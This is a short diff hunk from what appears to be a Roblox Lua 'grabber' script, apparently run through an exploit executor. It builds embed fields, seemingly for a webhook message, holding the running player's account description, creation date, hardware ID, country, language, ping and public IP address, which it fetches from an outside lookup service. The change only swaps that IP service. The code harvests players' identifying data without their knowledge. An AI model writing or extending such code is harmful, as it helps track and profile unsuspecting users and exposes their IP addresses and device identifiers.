@@ -83,7 +83,7 @@ pcall(function()
           {name = '**Account Description**', value = "'"..response.description.."'"},
           {name = '**Account Created**', value = ""..response.created..""},
           {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
-          {name = '**IP Address**', value = ''..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body},
+          {name = '**IP Address**', value = ''..req({ Url = "https://v4.ident.me/", Method = "Get" }).Body},
           {name = '**Country**', value = ''..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)},
           {name = '**Language**', value = ''..game.Players.LocalPlayer.LocaleId},
           {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
